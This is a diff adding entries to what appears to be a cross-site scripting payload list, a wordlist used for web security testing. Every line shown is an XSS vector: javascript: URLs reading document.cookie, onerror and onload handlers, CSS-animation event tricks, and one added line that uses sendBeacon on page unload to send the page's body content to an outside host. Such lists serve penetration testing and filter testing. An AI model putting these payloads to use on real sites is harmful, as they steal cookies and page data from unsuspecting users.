@@ -782,6 +782,11 @@ http://www.google<script .com>alert(document.location)</script
 <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 <img src="/" =_=" title="onerror='prompt(1)'">
 <%<!--'%><script>alert(1);</script -->
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+<body onbeforeprint=console.log(1)>
+<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
 <script src="data:text/javascript,alert(1)"></script>
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
